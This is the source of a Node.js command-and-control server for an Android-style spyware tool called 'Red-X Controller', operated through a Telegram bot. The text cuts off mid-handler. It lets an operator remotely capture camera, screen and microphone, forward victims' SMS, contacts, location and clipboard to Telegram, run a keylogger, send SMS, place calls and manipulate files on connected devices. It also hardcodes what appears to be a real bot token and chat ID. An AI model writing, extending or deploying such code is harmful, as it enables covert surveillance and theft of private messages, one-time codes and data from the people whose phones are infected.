const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');
const path = require('path');

// --- Configuration ---
const BOT_TOKEN = '8687604678:AAEJmrEYTLGri3gATkS343HRvMKwzWA-DMY';
const BOT_CHAT_ID = '8604942344';
const PORT = process.env.PORT || 3000;

// --- Initialize App ---
const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*", methods: ["GET", "POST"] }
});
const upload = multer();

// --- Initialize Telegram Bot ---
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
console.log('🤖 Bot is running...');

// --- In-Memory Storage ---
const appData = new Map();
const connectedDevices = new Map();

// --- Helper Functions ---
function broadcastToAll(event, data) {
    io.emit(event, data);
}

function broadcastToDevice(deviceId, event, data) {
    for (let [socketId, id] of connectedDevices) {
        if (id === deviceId) {
            io.to(socketId).emit(event, data);
            return true;
        }
    }
    return false;
}

function getMainKeyboard() {
    return {
        reply_markup: {
            keyboard: [
                ['📱 Device Info', '📊 Status'],
                ['📨 SMS', '📞 Call'],
                ['📷 Camera', '🎥 Video'],
                ['🎬 Screen Record', '📸 Screenshot'],
                ['🎤 Mic', '🔊 Volume'],
                ['📁 Files', '📍 Location'],
                ['👥 Contacts', '📋 Clipboard'],
                ['🔦 Flashlight', '📶 WiFi'],
                ['📡 Bluetooth', '✈️ Airplane'],
                ['🌙 DND', '📳 Vibrate'],
                ['🔄 Reboot', '💀 Kill App'],
                ['📨 SMS Forward', '📤 Upload File'],
                ['⬇️ Download', '🗑️ Delete'],
                ['📂 List Files', '⚙️ System Info'],
                ['📱 Running Apps', '🧹 Clear Cache'],
                ['🔐 Keylogger', '📱 Remote Control']
            ],
            resize_keyboard: true,
            one_time_keyboard: false
        }
    };
}

function getDeviceSelectionKeyboard(devices) {
    const keyboard = [];
    const deviceList = Array.from(devices.values());
    
    // Add devices in rows of 2
    for (let i = 0; i < deviceList.length; i += 2) {
        const row = [];
        row.push({ text: `📱 ${deviceList[i]}`, callback_data: `device_${deviceList[i]}` });
        if (i + 1 < deviceList.length) {
            row.push({ text: `📱 ${deviceList[i + 1]}`, callback_data: `device_${deviceList[i + 1]}` });
        }
        keyboard.push(row);
    }
    keyboard.push([{ text: '📡 All Devices', callback_data: 'device_all' }]);
    keyboard.push([{ text: '🔙 Back to Main', callback_data: 'main_menu' }]);
    
    return {
        reply_markup: {
            inline_keyboard: keyboard
        }
    };
}

// --- Socket.IO Connection Handler ---
io.on('connection', (socket) => {
    console.log(`🔌 New client connected: ${socket.id}`);
    let deviceId = socket.handshake.query.deviceId || `device_${socket.id.substring(0, 8)}`;
    let platform = socket.handshake.query.platform || 'unknown';

    connectedDevices.set(socket.id, deviceId);
    if (!appData.has(deviceId)) {
        appData.set(deviceId, {
            id: deviceId,
            platform: platform,
            connectedAt: new Date().toISOString(),
            smsForwarding: false,
            screenRecording: false,
            audioRecording: false,
            flashlight: false,
            wifi: false,
            bluetooth: false,
            keylogger: false,
            lastCommand: null
        });
    }

    bot.sendMessage(BOT_CHAT_ID, 
        `📱 *New Device Connected*\n` +
        `🆔 ID: \`${deviceId}\`\n` +
        `📱 Platform: ${platform}\n` +
        `🕐 Time: ${new Date().toLocaleString()}`,
        { 
            parse_mode: 'Markdown',
            ...getMainKeyboard()
        }
    );

    // --- Device Info Handler ---
    socket.on('deviceInfo', (info) => {
        try {
            const data = typeof info === 'string' ? JSON.parse(info) : info;
            const device = appData.get(deviceId) || {};
            appData.set(deviceId, { ...device, ...data, lastUpdate: new Date().toISOString() });
            console.log(`📊 Device info updated for ${deviceId}`);
        } catch (e) {
            console.error('Error parsing device info:', e);
        }
    });

    // --- Action Handler ---
    socket.on('action', (data) => {
        console.log(`📤 Action received: ${JSON.stringify(data)}`);
        const { action, target, from, ...extras } = data;
        const sender = from || deviceId;

        // Log action to Telegram
        bot.sendMessage(BOT_CHAT_ID,
            `📌 *Action Requested*\n` +
            `🎯 Action: ${action}\n` +
            `📱 From: ${sender}\n` +
            `🎯 Target: ${target || 'all'}\n` +
            `📦 Extras: ${JSON.stringify(extras)}`,
            { 
                parse_mode: 'Markdown',
                ...getMainKeyboard()
            }
        );

        if (target && target !== 'all') {
            broadcastToDevice(target, 'message', {
                request: action,
                extras: extras,
                from: sender,
                requestId: `req_${Date.now()}`
            });
        } else {
            broadcastToAll('message', {
                request: action,
                extras: extras,
                from: sender,
                requestId: `req_${Date.now()}`
            });
        }
    });

    // --- Response Handler ---
    socket.on('response', (data) => {
        console.log(`📩 Response received: ${JSON.stringify(data)}`);
        const { requestId, response } = data;
        bot.sendMessage(BOT_CHAT_ID,
            `📨 *Command Response*\n` +
            `🆔 Request: ${requestId}\n` +
            `📦 Data: ${JSON.stringify(response)}`,
            { 
                parse_mode: 'Markdown',
                ...getMainKeyboard()
            }
        );
    });

    // --- SMS Forwarding Handler ---
    socket.on('smsForward', (data) => {
        const { from, message, time } = data;
        bot.sendMessage(BOT_CHAT_ID,
            `📨 *SMS Forwarded*\n` +
            `📱 From: ${from}\n` +
            `📝 Message: ${message}\n` +
            `🕐 Time: ${time || new Date().toLocaleString()}`,
            { 
                parse_mode: 'Markdown',
                ...getMainKeyboard()
            }
        );
    });

    // --- File Upload Handler ---
    socket.on('fileUpload', (data) => {
        const { name, size, data: fileData } = data;
        const filePath = path.join(__dirname, 'downloads', `${Date.now()}_${name}`);
        if (!fs.existsSync('downloads')) fs.mkdirSync('downloads');
        fs.writeFileSync(filePath, Buffer.from(fileData, 'base64'));
        
        bot.sendMessage(BOT_CHAT_ID,
            `📁 *File Received*\n` +
            `📄 Name: ${name}\n` +
            `📦 Size: ${size} bytes\n` +
            `💾 Saved: ${filePath}`,
            { 
                parse_mode: 'Markdown',
                ...getMainKeyboard()
            }
        );
    });

    // --- File List Handler ---
    socket.on('fileList', (data) => {
        let fileList = '📂 *File List*\n\n';
        if (Array.isArray(data)) {
            data.forEach((file, index) => {
                fileList += `${index + 1}. 📄 ${file.name || 'Unknown'}\n`;
                fileList += `   📦 ${file.size || '0'} bytes\n`;
                if (file.isDirectory) fileList += `   📁 Directory\n`;
                fileList += `   🕐 ${file.lastModified || 'N/A'}\n\n`;
            });
        }
        bot.sendMessage(BOT_CHAT_ID, fileList || '📂 No files found', { 
            parse_mode: 'Markdown',
            ...getMainKeyboard()
        });
    });

    // --- Disconnect Handler ---
    socket.on('disconnect', () => {
        console.log(`🔌 Client disconnected: ${socket.id}`);
        const deviceId = connectedDevices.get(socket.id);
        if (deviceId) {
            connectedDevices.delete(socket.id);
            bot.sendMessage(BOT_CHAT_ID,
                `📱 *Device Disconnected*\n` +
                `🆔 ID: ${deviceId}`,
                { 
                    parse_mode: 'Markdown',
                    ...getMainKeyboard()
                }
            );
        }
    });

    socket.on('error', (error) => {
        console.error(`❌ Socket error: ${error}`);
    });
});

// --- Telegram Bot Command Handlers ---

// Command: /start - Show main menu
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;

    bot.sendMessage(chatId,
        `🚀 *Red-X Controller Bot*\n\n` +
        `📱 Connected Devices: ${connectedDevices.size}\n` +
        `🔌 Use the buttons below to control your devices!\n\n` +
        `📌 *Commands:*\n` +
        `• /status - Show device status\n` +
        `• /list - List all devices\n` +
        `• /help - Show this message`,
        { 
            parse_mode: 'Markdown',
            ...getMainKeyboard()
        }
    );
});

// Command: /help - Show help
bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;

    bot.sendMessage(chatId,
        `📚 *Red-X Controller Help*\n\n` +
        `📱 *Basic Controls:*\n` +
        `• 📷 Camera - Take photo\n` +
        `• 🎥 Video - Record video\n` +
        `• 🎬 Screen Record - Record screen\n` +
        `• 📸 Screenshot - Take screenshot\n` +
        `• 🎤 Mic - Record audio\n\n` +
        `🔦 *System Controls:*\n` +
        `• 🔦 Flashlight - Toggle flashlight\n` +
        `• 📶 WiFi - Toggle WiFi\n` +
        `• 📡 Bluetooth - Toggle Bluetooth\n` +
        `• ✈️ Airplane - Toggle airplane mode\n` +
        `• 🌙 DND - Toggle Do Not Disturb\n\n` +
        `📨 *Communication:*\n` +
        `• 📨 SMS - Send SMS\n` +
        `• 📞 Call - Make call\n` +
        `• 📨 SMS Forward - Forward SMS to Telegram\n\n` +
        `📁 *Files:*\n` +
        `• 📁 Files - Manage files\n` +
        `• 📤 Upload - Upload file\n` +
        `• ⬇️ Download - Download file\n` +
        `• 🗑️ Delete - Delete file\n` +
        `• 📂 List Files - List directory\n\n` +
        `⚙️ *Advanced:*\n` +
        `• 🔐 Keylogger - Enable/Disable keylogger\n` +
        `• 📱 Running Apps - List running apps\n` +
        `• 💀 Kill App - Kill application\n` +
        `• 🧹 Clear Cache - Clear app cache\n` +
        `• 📱 Remote Control - Full remote control\n\n` +
        `📌 *Device Selection:*\n` +
        `• Click device name to select specific device\n` +
        `• Use "All Devices" for broadcast commands`,
        { 
            parse_mode: 'Markdown',
            ...getMainKeyboard()
        }
    );
});

// Command: /status - Get status
bot.onText(/\/status/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;

    let status = `📊 *Device Status*\n`;
    status += `📱 Connected: ${connectedDevices.size}\n\n`;
    
    for (let [socketId, deviceId] of connectedDevices) {
        const info = appData.get(deviceId) || {};
        status += `🆔 *${deviceId}*\n`;
        status += `   📱 Platform: ${info.platform || 'unknown'}\n`;
        status += `   🔌 Connected: ${info.connectedAt || 'recently'}\n`;
        status += `   📨 SMS Forward: ${info.smsForwarding ? '✅' : '❌'}\n`;
        status += `   🎬 Screen Record: ${info.screenRecording ? '✅' : '❌'}\n`;
        status += `   🎤 Audio Record: ${info.audioRecording ? '✅' : '❌'}\n`;
        status += `   🔦 Flashlight: ${info.flashlight ? '✅' : '❌'}\n`;
        status += `   📶 WiFi: ${info.wifi ? '✅' : '❌'}\n`;
        status += `   📡 Bluetooth: ${info.bluetooth ? '✅' : '❌'}\n`;
        status += `   🔐 Keylogger: ${info.keylogger ? '✅' : '❌'}\n\n`;
    }

    bot.sendMessage(chatId, status, { 
        parse_mode: 'Markdown',
        ...getMainKeyboard()
    });
});

// Command: /list - List devices
bot.onText(/\/list/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;

    let response = `📱 *Connected Devices (${connectedDevices.size})*\n\n`;
    for (let [socketId, deviceId] of connectedDevices) {
        const info = appData.get(deviceId) || {};
        response += `🆔 \`${deviceId}\`\n`;
        response += `   📱 Platform: ${info.platform || 'unknown'}\n`;
        response += `   🕐 Connected: ${info.connectedAt || 'recently'}\n\n`;
    }
    bot.sendMessage(chatId, response, { 
        parse_mode: 'Markdown',
        ...getMainKeyboard()
    });
});

// --- Main Menu Button Handler ---
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    
    const text = msg.text;
    if (!text) return;

    // Check if it's a command (starts with /)
    if (text.startsWith('/')) return;

    // Get target device (store in session)
    let target = 'all';
    // Check if user has selected a specific device
    if (appData.has(`selected_${chatId}`)) {
        target = appData.get(`selected_${chatId}`);
    }

    // --- Main Menu Actions ---
    switch(text) {
        case '📱 Device Info':
            broadcastToAll('message', {
                request: 'getDeviceInfo',
                extras: {},
                from: 'telegram',
                requestId: `info_${Date.now()}`
            });
            bot.sendMessage(chatId, '📊 Requesting device info...', { ...getMainKeyboard() });
            break;

        case '📊 Status':
            bot.emit('text', { chat: { id: chatId }, text: '/status' });
            break;

        case '📨 SMS':
            bot.sendMessage(chatId, 
                `📨 *Send SMS*\n\n` +
                `Enter phone number and message in format:\n` +
                `\`+1234567890|Hello World\``,
                { 
                    parse_mode: 'Markdown',
                    reply_markup: {
                        keyboard: [['🔙 Back to Main']],
                        resize_keyboard: true,
                        one_time_keyboard: false
                    }
                }
            );
            // Wait for SMS input
            const smsListener = (msg) => {
                if (msg.text === '🔙 Back to Main') {
                    bot.removeListener('message', smsListener);
                    bot.sendMessage(chatId, '🔙 Returning to main menu', { ...getMainKeyboard() });
                    return;
                }
                const parts = msg.text.split('|');
                if (parts.length === 2) {
                    const [phone, message] = parts;
                    broadcastToAll('message', {
                        request: 'sendSms',
                        extras: { target: phone, message: message },
                        from: 'telegram',
                        requestId: `sms_${Date.now()}`
                    });
                    bot.sendMessage(chatId, `📨 Sending SMS to ${phone}...`, { ...getMainKeyboard() });
                } else {
                    bot.sendMessage(chatId, 
                        `❌ Invalid format!\n` +
                        `Use: \`+1234567890|Your message here\``,
                        { 
                            parse_mode: 'Markdown',
                            reply_markup: {
                                keyboard: [['🔙 Back to Main']],
                                resize_keyboard: true
                            }
                        }
                    );
                }
                bot.removeListener('message', smsListener);
            };
            bot.on('message', smsListener);
            break;

        case '📞 Call':
            bot.sendMessage(chatId,
                `📞 *Make Call*\n\n` +
                `Enter phone number:\n` +
                `\`+1234567890\``,
                {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        keyboard: [['🔙 Back to Main']],
                        resize_keyboard: true
                    }
                }
            );
            const callListener = (msg) => {
                if (msg.text === '🔙 Back to Main') {
                    bot.removeListener('message', callListener);
                    bot.sendMessage(chatId, '🔙 Returning to main menu', { ...getMainKeyboard() });
                    return;
                }
                const phone = msg.text.trim();
                broadcastToAll('message', {
                    request: 'makeCall',
                    extras: { target: phone },
                    from: 'telegram',
                    requestId: `call_${Date.now()}`
                });
                bot.sendMessage(chatId, `📞 Calling ${phone}...`, { ...getMainKeyboard() });
                bot.removeListener('message', callListener);
            };
            bot.on('message', callListener);
            break;

        case '📷 Camera':
            broadcastToAll('message', {
                request: 'takePhoto',
                extras: {},
                from: 'telegram',
                requestId: `cam_${Date.now()}`
            });
            bot.sendMessage(chatId, '📷 Taking photo...', { ...getMainKeyboard() });
            break;

        case '🎥 Video':
            broadcastToAll('message', {
                request: 'takeVideo',
                extras: {},
                from: 'telegram',
                requestId: `vid_${Date.now()}`
            });
            bot.sendMessage(chatId, '🎥 Recording video...', { ...getMainKeyboard() });
            break;

        case '🎬 Screen Record':
            bot.sendMessage(chatId,
                `🎬 *Screen Recording*\n\n` +
                `Choose action:`,
                {
                    reply_markup: {
                        keyboard: [
                            ['▶️ Start Recording', '⏹️ Stop Recording'],
                            ['🔙 Back to Main']
                        ],
                        resize_keyboard: true
                    }
                }
            );
            const recordListener = (msg) => {
                if (msg.text === '🔙 Back to Main') {
                    bot.removeListener('message', recordListener);
                    bot.sendMessage(chatId, '🔙 Returning to main menu', { ...getMainKeyboard() });
                    return;
                }
                if (msg.text === '▶️ Start Recording') {
                    broadcastToAll('message', {
                        request: 'screenRecord',
                        extras: {},
                        from: 'telegram',
                        requestId: `rec_${Date.now()}`
                    });
                    bot.sendMessage(chatId, '🎬 Screen recording started...', { ...getMainKeyboard() });
                } else if (msg.text === '⏹️ Stop Recording') {
                    broadcastToAll('message', {
                        request: 'stopScreenRecord',
                        extras: {},
                        from: 'telegram',
                        requestId: `rec_${Date.now()}`
                    });
                    bot.sendMessage(chatId, '⏹️ Screen recording stopped', { ...getMainKeyboard() });
                }
                bot.removeListener('message', recordListener);
            };
            bot.on('message', recordListener);
            break;

        case '📸 Screenshot':
            broadcastToAll('message', {
                request: 'takeScreenshot',
                extras: {},
                from: 'telegram',
                requestId: `ss_${Date.now()}`
            });
            bot.sendMessage(chatId, '📸 Taking screenshot...', { ...getMainKeyboard() });
            break;

        case '🎤 Mic':
            bot.sendMessage(chatId,
                `🎤 *Audio Recording*\n\n` +
                `Choose action:`,
                {
                    reply_markup: {
                        keyboard: [
                            ['▶️ Start Recording', '⏹️ Stop Recording'],
                            ['🔙 Back to Main']
                        ],
                        resize_keyboard: true
                    }
                }
            );
            const micListener = (msg) => {
                if (msg.text === '🔙 Back to Main') {
                    bot.removeListener('message', micListener);
                    bot.sendMessage(chatId, '🔙 Returning to main menu', { ...getMainKeyboard() });
                    return;
                }
                if (msg.text === '▶️ Start Recording') {
                    broadcastToAll('message', {
                        request: 'recordAudio',
                        extras: {},
                        from: 'telegram',
                        requestId: `mic_${Date.now()}`
                    });
                    bot.sendMessage(chatId, '🎤 Recording audio...', { ...getMainKeyboard() });
                } else if (msg.text === '⏹️ Stop Recording') {
                    broadcastToAll('message', {
                        request: 'stopAudioRecord',
                        extras: {},
                        from: 'telegram',
                        requestId: `mic_${Date.now()}`
                    });
                    bot.sendMessage(chatId, '⏹️ Audio recording stopped', { ...getMainKeyboard() });
                }
                bot.removeListener('message', micListener);
            };
            bot.on('message', micListener);
            break;

        case '🔊 Volume':
            bot.sendMessage(chatId,
                `🔊 *Volume Controls*\n\n` +
                `Choose action:`,
                {
                    reply_markup: {
                        keyboard: [
                            ['🔊 Volume Up', '🔉 Volume Down'],
                            ['🔇 Mute', '🔊 Unmute'],
                            ['🔙 Back to Main']
                        ],
                        resize_keyboard: true
                    }
                }
            );
            const volListener = (msg) => {
                if (msg.text === '🔙 Back to Main') {
                    bot.removeListener('message', volListener);
                    bot.sendMessage(chatId, '🔙 Returning to main menu', { ...getMainKeyboard() });
                    return;
                }
                const actionMap = {
                    '🔊 Volume Up': 'volumeUp',
                    '🔉 Volume Down': 'volumeDown',
                    '🔇 Mute': 'mute',
                    '🔊 Unmute': 'unmute'
                };
                if (actionMap[msg.text]) {
                    broadcastToAll('message', {
                        request: actionMap[msg.text],
                        extras: {},
                        from: 'telegram',
                        requestId: `vol_${Date.now()}`
                    });
                    bot.sendMessage(chatId, `🔊 ${msg.text}...`, { ...getMainKeyboard() });
                }
                bot.removeListener('message', volListener);
            };
            bot.on('message', volListener);
            break;

        case '📁 Files':
            bot.sendMessage(chatId,
                `📁 *File Manager*\n\n` +
                `Choose action:`,
                {
                    reply_markup: {
                        keyboard: [
                            ['📂 List Files', '⬇️ Download'],
                            ['📤 Upload', '🗑️ Delete'],
                            ['📋 Copy', '📂 Move'],
                            ['🔙 Back to Main']
                        ],
                        resize_keyboard: true
                    }
                }
            );
            const fileListener = (msg) => {
                if (msg.text === '🔙 Back to Main') {
                    bot.removeListener('message', fileListener);
                    bot.sendMessage(chatId, '🔙 Returning to main menu', { ...getMainKeyboard() });
                    return;
                }
                const actionMap = {
                    '📂 List Files': 'listFiles',
                    '⬇️ Download': 'downloadFile',
                    '📤 Upload': 'uploadFile',
                    '🗑️ Delete': 'deleteFile',
                    '📋 Copy': 'copyFile',
                    '📂 Move': 'moveFile'
                };
                if (actionMap[msg.text]) {
                    bot.sendMessage(chatId, `📁 Enter file path:\nExample: \`/sdcard/Download\``, {
                        parse_mode: 'Markdown',
                        reply_markup: {
                            keyboard: [['🔙 Back to Main']],
                            resize_keyboard: true
                        }
                    });
                    const pathListener = (msg2) => {
                        if (msg2.text === '🔙 Back to Main') {
                            bot.removeListener('message', pathListener);
                            bot.sendMessage(chatId, '🔙 Returning to main menu', { ...getMainKeyboard() });
                            return;
                        }
                        broadcastToAll('message', {
                            request: actionMap[msg.text],
                            extras: { path: msg2.text },
                            from: 'telegram',
                            requestId: `file_${Date.now()}`
                        });
                        bot.sendMessage(chatId, `📁 ${msg.text} on ${msg2.text}...`, { ...getMainKeyboard() });
                        bot.removeListener('message', pathListener);
                    };
                    bot.on('message', pathListener);
                }
                bot.removeListener('message', fileListener);
            };
            bot.on('message', fileListener);
            break;

        case '📍 Location':
            broadcastToAll('message', {
                request: 'getLocation',
                extras: {},
                from: 'telegram',
                requestId: `loc_${Date.now()}`
            });
            bot.sendMessage(chatId, '📍 Getting location...', { ...getMainKeyboard() });
            break;

        case '👥 Contacts':
            broadcastToAll('message', {
                request: 'getContacts',
                extras: {},
                from: 'telegram',
                requestId: `cont_${Date.now()}`
            });
            bot.sendMessage(chatId, '👥 Fetching contacts...', { ...getMainKeyboard() });
            break;

        case '📋 Clipboard':
            bot.sendMessage(chatId,
                `📋 *Clipboard*\n\n` +
                `Choose action:`,
                {
                    reply_markup: {
                        keyboard: [
                            ['📋 Get Clipboard', '📝 Set Clipboard'],
                            ['🔙 Back to Main']
                        ],
                        resize_keyboard: true
                    }
                }
            );
            const clipListener = (msg) => {
                if (msg.text === '🔙 Back to Main') {
                    bot.removeListener('message', clipListener);
                    bot.sendMessage(chatId, '🔙 Returning to main menu', { ...getMainKeyboard() });
                    return;
                }
                if (msg.text === '📋 Get Clipboard') {
                    broadcastToAll('message', {
                        request: 'getClipboard',
                        extras: {},
                        from: 'telegram',
                        requestId: `clip_${Date.now()}`
                    });
                    bot.sendMessage(chatId, '📋 Getting clipboard...', { ...getMainKeyboard() });
                } else if (msg.text === '📝 Set Clipboard') {
                    bot.sendMessage(chatId, `📝 Enter text to copy to clipboard:`, {
                        reply_markup: {
                            keyboard: [['🔙 Back to Main']],
                            resize_keyboard: true
                        }
                    });
                    const setClipListener = (msg2) => {
                        if (msg2.text === '🔙 Back to Main') {
                            bot.removeListener('message', setClipListener);
                            bot.sendMessage(chatId, '🔙 Returning to main menu', { ...getMainKeyboard() });
                            return;
                        }
                        broadcastToAll('message', {
                            request: 'setClipboard',
                            extras: { text: msg2.text },
                            from: 'telegram',
                            requestId: `clip_${Date.now()}`
                        });
                        bot.sendMessage(chatId, `📝 Clipboard set!`, { ...getMainKeyboard() });
                        bot.removeListener('message', setClipListener);
                    };
                    bot.on('message', setClipListener);
                }
                bot.removeListener('message', clipListener);
            };
            bot.on('message', clipListener);
            break;

        case '🔦 Flashlight':
            bot.sendMessage(chatId,
                `🔦 *Flashlight Control*\n\n` +
                `Choose action:`,
                {
                    reply_markup: {
                        keyboard: [
                            ['🔦 Turn On', '🔦 Turn Off'],
                            ['🔙 Back to Main']
                        ],
                        resize_keyboard: true
                    }
                }
            );
            const flashListener = (msg) => {
                if (msg.text === '🔙 Back to Main') {
                    bot.removeListener('message', flashListener);
                    bot.sendMessage(chatId, '🔙 Returning to main menu', { ...getMainKeyboard() });
                    return;
                }
                if (msg.text === '🔦 Turn On') {
                    broadcastToAll('message', {
                        request: 'flashlightOn',
                        extras: {},
                        from: 'telegram',
                        requestId: `flash_${Date.now()}`
                    });
                    bot.sendMessage(chatId, '🔦 Flashlight turned ON', { ...getMainKeyboard() });
                } else if (msg.text === '🔦 Turn Off') {
                    broadcastToAll('message', {
                        request: 'flashlightOff',
                        extras: {},
                        from: 'telegram',
                        requestId: `flash_${Date.now()}`
                    });
                    bot.sendMessage(chatId, '🔦 Flashlight turned OFF', { ...getMainKeyboard() });
                }
                bot.removeListener('message', flashListener);
            };
            bot.on('message', flashListener);
            break;

        case '📶 WiFi':
            bot.sendMessage(chatId,
                `📶 *WiFi Control*\n\n` +
                `Choose action:`,
                {
                    reply_markup: {
                        keyboard: [
                            ['📶 WiFi On', '📶 WiFi Off'],
                            ['🔙 Back to Main']
                        ],
                        resize_keyboard: true
                    }
                }
            );
            const wifiListener = (msg) => {
                if (msg.text === '🔙 Back to Main') {
                    bot.removeListener('message', wifiListener);
                    bot.sendMessage(chatId, '🔙 Returning to main menu', { ...getMainKeyboard() });
                    return;
                }
                if (msg.text === '📶 WiFi On') {
                    broadcastToAll('message', {
                        request: 'wifiOn',
                        extras: {},
                        from: 'telegram',
                        requestId: `wifi_${Date.now()}`
                    });
                    bot.sendMessage(chatId, '📶 WiFi turned ON', { ...getMainKeyboard() });
                } else if (msg.text === '📶 WiFi Off') {
                    broadcastToAll('message', {
                        request: 'wifiOff',
                        extras: {},
                        from: 'telegram',
                        requestId: `wifi_${Date.now()}`
                    });
                    bot.sendMessage(chatId, '📶 WiFi turned OFF', { ...getMainKeyboard() });
                }
                bot.removeListener('message', wifiListener);
            };
            bot.on('message', wifiListener);
            break;

        case '📡 Bluetooth':
            bot.sendMessage(chatId,
                `📡 *Bluetooth Control*\n\n` +
                `Choose action:`,
                {
                    reply_markup: {
                        keyboard: [
                            ['📡 BT On', '📡 BT Off'],
                            ['🔙 Back to Main']
                        ],
                        resize_keyboard: true
                    }
                }
            );
            const btListener = (msg) => {
                if (msg.text === '🔙 Back to Main') {
                    bot.removeListener('message', btListener);
                    bot.sendMessage(chatId, '🔙 Returning to main menu', { ...getMainKeyboard() });
                    return;
                }
                if (msg.text === '📡 BT On') {
                    broadcastToAll('message', {
                        request: 'bluetoothOn',
                        extras: {},
                        from: 'telegram',
                        requestId: `bt_${Date.now()}`
                    });
                    bot.sendMessage(chatId, '📡 Bluetooth turned ON', { ...getMainKeyboard() });
                } else if (msg.text === '📡 BT Off') {
                    broadcastToAll('message', {
                        request: 'bluetoothOff',
                        extras: {},
                        from: 'telegram',
                        requestId: `bt_${Date.now()}`
                    });
                    bot.sendMessage(chatId, '📡 Bluetooth turned OFF', { ...getMainKeyboard() });
                }
                bot.removeListener('message', btListener);
            };
            bot.on('message', btListener);
            break;

        case '✈️ Airplane':
            broadcastToAll('message', {
                request: 'toggleAirplaneMode',
                extras: {},
                from: 'telegram',
                requestId: `air_${Date.now()}`
            });
            bot.sendMessage(chatId, '✈️ Toggling airplane mode...', { ...getMainKeyboard() });
            break;

        case '🌙 DND':
            broadcastToAll('message', {
                request: 'toggleDND',
                extras: {},
                from: 'telegram',
                requestId: `dnd_${Date.now()}`
            });
            bot.sendMessage(chatId, '🌙 Toggling Do Not Disturb...', { ...getMainKeyboard() });
            break;

        case '📳 Vibrate':
            bot.sendMessage(chatId,
                `📳 *Vibrate*\n\n` +
                `Enter duration in milliseconds:\n` +
                `Example: \`500\``,
                {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        keyboard: [
                            ['500ms', '1000ms'],
                            ['2000ms', '5000ms'],
                            ['🔙 Back to Main']
                        ],
                        resize_keyboard: true
                    }
                }
            );
            const vibListener = (msg) => {
                if (msg.text === '🔙 Back to Main') {
                    bot.removeListener('message', vibListener);
                    bot.sendMessage(chatId, '🔙 Returning to main menu', { ...getMainKeyboard() });
                    return;
                }
                let duration = parseInt(msg.text);
                if (isNaN(duration)) {
                    // Check preset buttons
                    const preset = {
                        '500ms': 500,
                        '1000ms': 1000,
                        '2000ms': 2000,
                        '5000ms': 5000
                    };
                    duration = preset[msg.text] || 500;
                }
                broadcastToAll('message', {
                    request: 'vibrate',
                    extras: { duration: duration },
                    from: 'telegram',
                    requestId: `vib_${Date.now()}`
                });
                bot.sendMessage(chatId, `📳 Vibrating for ${duration}ms...`, { ...getMainKeyboard() });
                bot.removeListener('message', vibListener);
            };
            bot.on('message', vibListener);
            break;

        case '🔄 Reboot':
            bot.sendMessage(chatId,
                `🔄 *Reboot*\n\n` +
                `⚠️ This will reboot the device!\n` +
                `Choose option:`,
                {
                    reply_markup: {
                        keyboard: [
                            ['✅ Confirm Reboot', '❌ Cancel'],
                            ['🔙 Back to Main']
                        ],
                        resize_keyboard: true
                    }
                }
            );
            const rebootListener = (msg) => {
                if (msg.text === '🔙 Back to Main' || msg.text === '❌ Cancel') {
                    bot.removeListener('message', rebootListener);
                    bot.sendMessage(chatId, '🔙 Returning to main menu', { ...getMainKeyboard() });
                    return;
                }
                if (msg.text === '✅ Confirm Reboot') {
                    broadcastToAll('message', {
                        request: 'reboot',
                        extras: {},
                        from: 'telegram',
                        requestId: `reb_${Date.now()}`
                    });
                    bot.sendMessage(chatId, '🔄 Rebooting device...', { ...getMainKeyboard() });
                }
                bot.removeListener('message', rebootListener);
            };
            bot.on('message', rebootListener);
            break;

        case '💀 Kill App':
            bot.sendMessage(chatId,
                `💀 *Kill App*\n\n` +
                `Enter package name to kill:\n` +
                `Example: \`com.android.chrome\``,
                {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        keyboard: [['🔙 Back to Main']],
                        resize_keyboard: true
                    }
                }
            );
            const killListener = (msg) => {
                if (msg.text === '🔙 Back to Main') {
                    bot.removeListener('message', killListener);
                    bot.sendMessage(chatId, '🔙 Returning to main menu', { ...getMainKeyboard() });
                    return;
                }
                broadcastToAll('message', {
                    request: 'killApp',
                    extras: { package: msg.text },
                    from: 'telegram',
                    requestId: `kill_${Date.now()}`
                });
                bot.sendMessage(chatId, `💀 Killing ${msg.text}...`, { ...getMainKeyboard() });
                bot.removeListener('message', killListener);
            };
            bot.on('message', killListener);
            break;

        case '📨 SMS Forward':
            bot.sendMessage(chatId,
                `📨 *SMS Forwarding*\n\n` +
                `Choose action:`,
                {
                    reply_markup: {
                        keyboard: [
                            ['✅ Enable Forwarding', '❌ Disable Forwarding'],
                            ['🔙 Back to Main']
                        ],
                        resize_keyboard: true
                    }
                }
            );
            const fwdListener = (msg) => {
                if (msg.text === '🔙 Back to Main') {
                    bot.removeListener('message', fwdListener);
                    bot.sendMessage(chatId, '🔙 Returning to main menu', { ...getMainKeyboard() });
                    return;
                }
                if (msg.text === '✅ Enable Forwarding') {
                    broadcastToAll('message', {
                        request: 'enableSMSForward',
                        extras: {},
                        from: 'telegram',
                        requestId: `fwd_${Date.now()}`
                    });
                    bot.sendMessage(chatId, '📨 SMS forwarding ENABLED', { ...getMainKeyboard() });
                } else if (msg.text === '❌ Disable Forwarding') {
                    broadcastToAll('message', {
                        request: 'disableSMSForward',
                        extras: {},
                        from: 'telegram',
                        requestId: `fwd_${Date.now()}`
                    });
                    bot.sendMessage(chatId, '📨 SMS forwarding DISABLED', { ...getMainKeyboard() });
                }
                bot.removeListener('message', fwdListener);
            };
            bot.on('message', fwdListener);
            break;

        case '📤 Upload File':
            bot.sendMessage(chatId,
                `📤 *Upload File*\n\n` +
                `Send me a file to upload to devices.\n` +
                `You can send any file (image, document, etc.)`,
                {
                    reply_markup: {
                        keyboard: [['🔙 Back to Main']],
                        resize_keyboard: true
                    }
                }
            );
            // File upload will be handled by the document handler below
            break;

        case '⬇️ Download':
            bot.sendMessage(chatId,
                `⬇️ *Download File*\n\n` +
